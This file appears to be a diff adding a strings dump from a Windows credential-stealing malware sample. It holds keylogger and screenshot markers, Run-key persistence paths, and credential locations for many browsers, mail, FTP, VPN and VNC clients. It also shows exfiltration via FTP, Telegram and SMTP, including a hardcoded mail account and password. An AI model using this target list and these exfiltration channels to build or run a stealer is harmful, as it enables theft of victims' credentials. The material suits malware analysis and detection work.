@@ -1,0 +1,808 @@
+20
+yyyy-MM-dd HH:mm:ss
+yyyy_MM_dd_HH_mm_ss
+<br>
+<hr>
+ObjectLength
+ChainingModeGCM
+AuthTagLength
+ChainingMode
+KeyDataBlob
+AES
+Microsoft Primitive Provider
+CONNECTION
+KEEP-ALIVE
+PROXY-AUTHENTICATE
+PROXY-AUTHORIZATION
+TE
+TRAILER
+TRANSFER-ENCODING
+UPGRADE
+%startupfolder%
+\%insfolder%\%insname%
+/
+\%insfolder%\
+Software\Microsoft\Windows\CurrentVersion\Run
+%insregname%
+SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
+True
+https://api.ipify.org%
+GET
+Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+OK
+http://rSJyTT.com
+\fBK
+SELECT * FROM Win32_Processor
+Name
+ MB
+Unknown
+CO
+CO_
+-
+_
+.zip
+ 
+yyyy-MM-dd hh-mm-ss
+Cookie
+application/zip
+SC
+SC_
+.jpeg
+Screenshot
+image/jpeg
+/log.tmp
+KL
+KL_
+.html
+<html>
+</html>
+Log
+text/html
+[
+]
+Time: 
+MM/dd/yyyy HH:mm:ss
+User Name: 
+Computer Name: 
+OSFullName: 
+CPU: 
+RAM: 
+IP Address: 
+New 
+ Recovered!
+User Name
+: 
+OSFullName
+uninstall
+Software\Microsoft\Windows NT\CurrentVersion\Windows
+Load
+%ftphost%/
+%ftpuser%
+%ftppassword%
+STOR
+Length
+Write
+Close
+GetBytes
+Opera Browser
+Opera Software\Opera Stable
+Yandex Browser
+Yandex\YandexBrowser\User Data
+Iridium Browser
+Iridium\User Data
+Chromium
+Chromium\User Data
+7Star
+7Star\7Star\User Data
+Torch Browser
+Torch\User Data
+Cool Novo
+MapleStudio\ChromePlus\User Data
+Kometa
+Kometa\User Data
+Amigo
+Amigo\User Data
+Brave
+BraveSoftware\Brave-Browser\User Data
+CentBrowser
+CentBrowser\User Data
+Chedot
+Chedot\User Data
+Orbitum
+Orbitum\User Data
+Sputnik
+Sputnik\Sputnik\User Data
+Comodo Dragon
+Comodo\Dragon\User Data
+Vivaldi
+Vivaldi\User Data
+Citrio
+CatalinaGroup\Citrio\User Data
+360 Browser
+360Chrome\Chrome\User Data
+Uran
+uCozMedia\Uran\User Data
+Liebao Browser
+liebao\User Data
+Elements Browser
+Elements Browser\User Data
+Epic Privacy
+Epic Privacy Browser\User Data
+Coccoc
+CocCoc\Browser\User Data
+Sleipnir 6
+Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer
+QIP Surf
+QIP Surf\User Data
+Coowon
+Coowon\Coowon\User Data
+,
+"
+URL:
+Username:
+Password:
+Application:
+PW
+PW_
+ 
+limitless@botswlogistics.com
+*(QSTCj8
+smtp.botswlogistics.com
+image/jpg
+:Zone.Identifier
+\tmpG
+.tmp
+%urlkey%
+-f 
+\Data\Tor\torrc
+p=
+%PostURL%
+127.0.0.1
+POST
++
+%2B
+application/x-www-form-urlencoded
+&
+&amp;
+<
+&lt;
+>
+&gt;
+&quot;
+Copied Text: 
+<font color="#00b1ba"><b>[ 
+</b>
+ <b>]</b> <font color="#000000">(
+)</font></font>
+False
+<font color="#00ba66">{BACK}</font>
+</font>
+<font color="#00ba66">{ALT+TAB}</font>
+<font color="#00ba66">{ALT+F4}</font>
+<font color="#00ba66">{TAB}</font>
+<font color="#00ba66">{ESC}</font>
+<font color="#00ba66">{Win}</font>
+<font color="#00ba66">{CAPSLOCK}</font>
+<font color="#00ba66">&uarr;</font>
+<font color="#00ba66">&darr;</font>
+<font color="#00ba66">&larr;</font>
+<font color="#00ba66">&rarr;</font>
+<font color="#00ba66">{DEL}</font>
+<font color="#00ba66">{END}</font>
+<font color="#00ba66">{HOME}</font>
+<font color="#00ba66">{Insert}</font>
+<font color="#00ba66">{NumLock}</font>
+<font color="#00ba66">{PageDown}</font>
+<font color="#00ba66">{PageUp}</font>
+<font color="#00ba66">{ENTER}</font>
+<font color="#00ba66">{F1}</font>
+<font color="#00ba66">{F2}</font>
+<font color="#00ba66">{F3}</font>
+<font color="#00ba66">{F4}</font>
+<font color="#00ba66">{F5}</font>
+<font color="#00ba66">{F6}</font>
+<font color="#00ba66">{F7}</font>
+<font color="#00ba66">{F8}</font>
+<font color="#00ba66">{F9}</font>
+<font color="#00ba66">{F10}</font>
+<font color="#00ba66">{F11}</font>
+<font color="#00ba66">{F12}</font>
+control
+<font color="#00ba66">{CTRL}</font>
+Windows RDP
+credential
+policy
+blob
+rdg
+chrome
+{{{0}}}
+CopyTo
+ComputeHash
+sha512
+Copy
+SystemDrive
+\
+WScript.Shell
+RegRead
+g
+401
+
+
+502 
+
+
+
+500 
+Add
+chat_id
+caption
+/sendDocument
+document
+---------------------------
+x
+
+--
+
+
+multipart/form-data; boundary=
+Content-Disposition: form-data; name="{0}"
+
+{1}
+Content-Disposition: form-data; name="{0}"; filename="{1}"
+Content-Type: {2}
+
+
+--
+
+Cookies
+Opera
+Chrome
+\Google\Chrome\User Data
+\360Chrome\Chrome\User Data
+Yandex
+SRWare Iron
+Brave Browser
+\Iridium\User Data
+CoolNovo
+Epic Privacy Browser
+CocCoc
+QQ Browser
+Tencent\QQBrowser\User Data
+UC Browser
+UCBrowser\
+uCozMedia
+cookies.sqlite
+Firefox
+APPDATA
+\Mozilla\Firefox\
+IceCat
+\Mozilla\icecat\
+PaleMoon
+\Moonchild Productions\Pale Moon\
+SeaMonkey
+\Mozilla\SeaMonkey\
+Flock
+\Flock\Browser\
+K-Meleon
+\K-Meleon\
+Postbox
+\Postbox\
+Thunderbird
+\Thunderbird\
+IceDragon
+\Comodo\IceDragon\
+WaterFox
+\Waterfox\
+BlackHawk
+\NETGATE Technologies\BlackHawk\
+CyberFox
+\8pecxstudios\Cyberfox\
+Path=([A-z0-9\/\.\-]+)
+profiles.ini
+\Default\
+Profile
+origin_url
+username_value
+password_value
+v10
+v11
+Opera Stable
+\Local State
+"encrypted_key":"(.*?)"
+\Default\Login Data
+\Login Data
+\Google\Chrome\User Data\
+logins
+Major
+Minor
+2F1A6504-0641-44CF-8BB5-3612D865F2E5
+Windows Secure Note
+3CCD5499-87A8-4B10-A215-608888DD3B55
+Windows Web Password Credential
+154E23D0-C644-4E6F-8CE6-5069272F999F
+Windows Credential Picker Protector
+4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+Web Credentials
+77BC582B-F0A6-4E15-4E80-61736B6F3B29
+Windows Credentials
+E69D7838-91B5-4FC9-89D5-230D4D4CC2BC
+Windows Domain Certificate Credential
+3E0E35BE-1B77-43E7-B873-AED901B6275B
+Windows Domain Password Credential
+3C886FF3-2669-4AA2-A8FB-3F6759A77548
+Windows Extended Credential
+00000000-0000-0000-0000-000000000000
+SchemaId
+pResourceElement
+pIdentityElement
+pPackageSid
+pAuthenticatorElement
+IE/Edge
+Type
+Value
+\Common Files\Apple\Apple Application Support\plutil.exe
+\Apple Computer\Preferences\keychain.plist
+*
+Login Data
+journal
+wow_logins
+\Microsoft\Edge\User Data
+Edge Chromium
+\Microsoft\Credentials\
+\Microsoft\Protect\
+GuidMasterKey
+\Default\EncryptedStorage
+\EncryptedStorage
+entries
+category
+Password
+str3
+str2
+blob0
+PopPassword
+SmtpPassword
+Software\IncrediMail\Identities\
+\Accounts_New
+EmailAddress
+SmtpServer
+incredimail
+HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine
+current
+Settings
+SavePasswordText
+ReturnAddress
+Eudora
+\falkon\profiles\
+startProfile="([A-z0-9\/\.]+)"
+\browsedata.db
+autofill
+Falkon Browser
+startProfile=([A-z0-9\/\.]+)
+Backend=([A-z0-9\/\.-]+)
+\settings.ini
+\Claws-mail
+\clawsrc
+passkey0
+master_passphrase_salt=(.+)
+master_passphrase_pbkdf2_rounds=(.+)
+use_master_passphrase=(.+)
+\accountrc
+smtp_server
+address
+account
+\passwordstorerc
+{(.*),(.*)}(.*)
+ClawsMail
+TransformFinalBlock
+Substring
+IterationCount
+signons3.txt
+---
+
+.
+
+objects
+Data
+DecryptTripleDes
+Flock Browser
+ALLUSERSPROFILE
+\\
+DynDNS\Updater\config.dyndns
+username=
+=
+password=
+&H
+t6KzXhCh
+http://DynDns.com
+DynDNS
+\Psi\profiles
+\Psi+\profiles
+\accounts.xml
+name
+jid
+password
+Psi/Psi+
+Software\OpenVPN-GUI\configs
+Software\OpenVPN-GUI\configs\
+username
+auth-data
+entropy
+Open VPN
+USERPROFILE
+\OpenVPN\config\
+remote 
+\FileZilla\recentservers.xml
+<Server>
+<Host>
+</Host>
+:
+<Port>
+</Port>
+<User>
+</User>
+<Pass encoding="base64">
+</Pass>
+<Pass>
+FileZilla
+SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions
+HostName
+UserName
+PublicKeyFile
+PortNumber
+22
+[PRIVATE KEY LOCATION: "{0}"]
+WinSCP
+Username
+All Users
+\FlashFXP\3quick.dat
+IP=
+port=
+user=
+pass=
+created=
+FlashFXP
+\FTP Navigator\Ftplist.txt
+Server
+No Password
+User
+FTP Navigator
+Programfiles(x86)
+programfiles
+\jDownloader\config\database.script
+programfiles(x86)
+INSERT INTO CONFIG VALUES('AccountController','
+sq
+.
+t
+xt
+JDownloader
+Software\Paltalk
+HKEY_CURRENT_USER\Software\Paltalk\
+pwd
+Paltalk
+\.purple\accounts.xml
+<account>
+<protocol>
+</protocol>
+<name>
+</name>
+<password>
+</password>
+Pidgin
+\SmartFTP\Client 2.0\Favorites\Quick Connect\
+\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml
+<Password>
+</Password>
+<Name>
+</Name>
+SmartFTP
+appdata
+\Ipswitch\WS_FTP\Sites\ws_ftp.ini
+HOST
+UID
+PWD
+WS_FTP
+PWD=
+Key
+Mode
+IV
+Padding
+CreateDecryptor
+\cftp\Ftplist.txt
+;Server=
+;Port=
+;Password=
+;User=
+;Anonymous=
+Name=
+FTPCommander
+\FTPGetter\servers.xml
+<server>
+<server_ip>
+</server_ip>
+<server_port>
+</server_port>
+<server_user_name>
+</server_user_name>
+<server_user_password>
+</server_user_password>
+FTPGetter
+HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC
+HKEY_CURRENT_USER\SOFTWARE\Vitalwerks\DUC
+USERname
+NO-IP
++-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
+\The Bat!
+\Account.CFN
+zzz
+   
+TheBat
+HKEY_CURRENT_USER\Software\RimArts\B2\Settings
+DataDir
+Folder.lst
+\Mailbox.ini
+Account
+SMTPServer
+MailAddress
+PassWd
+Becky!
+\Trillian\users\global\accounts.dat
+Accounts
+Trillian
+Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A
+00104B2A6676
+Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676
+Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
+Email
+IMAP Password
+POP3 Password
+HTTP Password
+SMTP Password
+SMTP Server
+Outlook
+HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview
+Executable
+HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1
+FoxmailPath
+\Storage\
+\mail\
+\VirtualStore\Program Files\Foxmail\mail\
+\VirtualStore\Program Files (x86)\Foxmail\mail\
+\Accounts\Account.rec0
+\Account.stg
+Read
+Dispose
+POP3Host
+SMTPHost
+IncomingServer
+POP3Password
+Foxmail
+5A
+71
+\Opera Mail\Opera Mail\wand.dat
+opera:
+Opera Mail
+abcçdefgğhıijklmnoöpqrsştuüvwxyz1234567890_-.~!@#$%^&*()[{]}\|';:,<>/?+=
+ 
+\Pocomail\accounts.ini
+POPPass
+SMTPPass
+SMTP
+PocoMail
+RealVNC 4.x
+SOFTWARE\Wow6432Node\RealVNC\WinVNC4
+RealVNC 3.x
+SOFTWARE\RealVNC\vncserver
+SOFTWARE\RealVNC\WinVNC4
+Software\ORL\WinVNC3
+TightVNC
+Software\TightVNC\Server
+PasswordViewOnly
+TightVNC ControlPassword
+ControlPassword
+TigerVNC
+Software\TigerVNC\Server
+Trim
+UltraVNC
+ProgramFiles(x86)
+\uvnc bvba\UltraVNC\ultravnc.ini
+passwd
+passwd2
+ProgramFiles
+\UltraVNC\ultravnc.ini
+
+
+
+\eM Client
+.dll
+eM Client\accounts.dat
+eM Client
+AccountConfiguration
+72905C47-F4FD-4CF7-A489-4E8121A155BD
+host
+o6806642kbM7c5
+\Mailbird\Store\Store.db
+Server_Host
+EncryptedPassword
+Mailbird
+SenderIdentities
+NordVPN
+NordVPN directory not found!
+NordVpn.exe*
+user.config
+SelectSingleNode
+//setting[@name='Username']/value
+InnerText
+//setting[@name='Password']/value
+\MySQL\Workbench\workbench_user_data.dat
+
+
+MySQL Workbench
+%ProgramW6432%
+Private Internet Access\data
+\Private Internet Access\data
+\account.json
+.*"username":"(.*?)"
+.*"password":"(.*?)"
+Private Internet Access
+<array>
+<dict>
+<string>
+</string>
+<data>
+</data>
+Safari Browser
+ -convert xml1 -s -o "
+\fixed_keychain.xml" 
+A
+10
+B
+11
+C
+12
+D
+13
+E
+14
+F
+15
+ABCDEF
+(
+EndsWith
+)
+IndexOf
+UNIQUE
+table
+Software\DownloadManager\Passwords\
+EncPassword
+Internet Download Manager
+{0}
+http://127.0.0.1:
+HTTP/1.1 
+Hostname
+Port
+200 Connection established
+Proxy-Agent: HToS5x
+
+
+Connect
+Host
+PathAndQuery
+Fragment
+
+Host: 
+Wr
+W
+ExtractFile
+n
+Tor
+AUTHENTICATE "%torpass%"
+SIGNAL NEWNYM
+250
+tor
+StartInfo
+FileName
+\Tor\tor.exe
+Arguments
+UseShellExecute
+RedirectStandardOutput
+CreateNoWindow
+Start
+StandardOutput
+ReadLine
+Contains
+Bootstrapped 100%
+EndOfStream
+Id
+AvoidDiskWrites 1
+Log notice stdout
+DormantCanceledByStartup 1
+ControlPort 9051
+CookieAuthentication 1
+runasdaemon 1
+ExtORPort auto
+hashedcontrolpassword %hash%
+DataDirectory %tordir%\Data\Tor
+GeoIPFile %tordir%\Data\Tor\geoip
+GeoIPv6File %tordir%\Data\Tor\geoip6
+
+\tor.zip
+https://www.theonionrouter.com/dist.torproject.org/torbrowser/9.5.3/tor-win32-0.4.3.6.zip
+%tordir%
+%hash%
+%torpass%
+https://www.theonionrouter.com/dist.torproject.org/torbrowser/
+<a.+?href\s*=\s*(["'])(?<href>.+?)\1[^>]*>
+href
+Replace
+TrimStart
+TrimEnd
+tor-win32-
+TransformBlock
+Hash
+16:
+None
+win32_processor
+processorID
+1effbb74-026f-472b-a31e-9486b28a7c3f
+Win32_NetworkAdapterConfiguration
+IPEnabled
+MacAddress
+086f1cb6-076b-4601-a5c6-49449e8a6b70
+WinMgmts:
+InstancesOf
+Win32_BaseBoard
+SerialNumber
+8664d018-26e6-4793-953e-d7e52ac62805
+x2
+00061561
+Berkelet DB
+00000002
+ 1.85 (Hash, version 2, native byte-order)
+Unknow database format
+SEQUENCE {
+{0:X2}
+	INTEGER 
+	OCTETSTRING 
+	OBJECTIDENTIFIER 
+}
+sha256
+key4.db
+metaData
+id
+item1
+item2
+nssPrivate
+a11
+a102
+2a864886f70d0209
+2a864886f70d010c050103
+key3.db
+global-salt
+Version
+password-check
+logins.json
+\"(hostname|encryptedPassword|encryptedUsername)":"(.*?)"
+[^\u0020-\u007F]
+signons.sqlite
+moz_logins
+hostname
+encryptedUsername
+encryptedPassword
+Version=4.0.0.0
+version=2.0.0.0
+mscorlib
+System
+MailClient.Protocols.Smtp.SmtpAccountConfiguration
+MailClient.Accounts.TlsType
+MailClient.Accounts.CredentialsModelTypes
+MailClient.Accounts.Mail.MailAccountConfiguration
+MailClient.Accounts.ArchivingScope
+MailClient.Mail.MailAddress
+;
+info
+AccountConfiguration+accountName
+AccountConfiguration+username
+AccountConfiguration+password
+providerName
